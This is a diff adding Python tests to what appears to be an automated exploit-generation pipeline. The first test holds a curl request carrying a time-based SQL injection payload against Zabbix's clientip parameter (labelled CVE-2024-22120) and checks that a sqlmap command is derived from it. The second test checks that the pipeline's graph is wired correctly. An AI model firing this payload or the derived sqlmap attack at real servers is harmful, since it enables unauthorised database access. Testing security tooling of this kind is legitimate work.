@@ -271,3 +271,40 @@ print('OK')
 """
     out, err, rc = _in_container(py)
     assert rc == 0 and 'OK' in out, f"out={out} err={err}"
+
+
+def test_derive_tools_for_poc_sqli_to_sqlmap():
+    # Once a SQLi PoC exists, the system derives sqlmap and builds the call.
+    py = r"""
+import sys; sys.path.insert(0,'/app')
+from api import _derive_tools_for_poc
+cmd = ("curl -s -X POST 'http://t:8080/zabbix.php' "
+       "-d 'action=script.execute&hostid=10084&clientip=1%27%20AND%20SLEEP(5)--%20-&sid=abc' "
+       "-b 'zbx_session=eyJ=='")
+tools = _derive_tools_for_poc(cmd, assertion={'min_seconds':5}, product='Zabbix', cve='CVE-2024-22120')
+sm = [t for t in tools if t['tool']=='sqlmap']
+assert sm, tools
+assert sm[0]['class']=='sqli' and sm[0]['binary']=='sqlmap', sm[0]
+assert sm[0]['command'].startswith('sqlmap '), sm[0]['command']
+assert '-p clientip' in sm[0]['command'] and '--technique=T' in sm[0]['command'], sm[0]['command']
+assert sm[0]['confirm_markers'], sm[0]
+# non-SQLi PoC derives nothing
+assert _derive_tools_for_poc("curl -s http://t/status") == []
+print('OK')
+"""
+    out, err, rc = _in_container(py)
+    assert rc == 0 and 'OK' in out, f"out={out} err={err}"
+
+
+def test_graph_wires_tool_handoff_after_save_store():
+    py = r"""
+import sys; sys.path.insert(0,'/app')
+import build_poc_graph as b
+G = b.build_graph().get_graph()
+assert 'tool_handoff' in set(G.nodes.keys())
+edges = [(e.source, e.target) for e in G.edges]
+assert ('save_store','tool_handoff') in edges, edges
+print('OK')
+"""
+    out, err, rc = _in_container(py)
+    assert rc == 0 and 'OK' in out, f"out={out} err={err}"
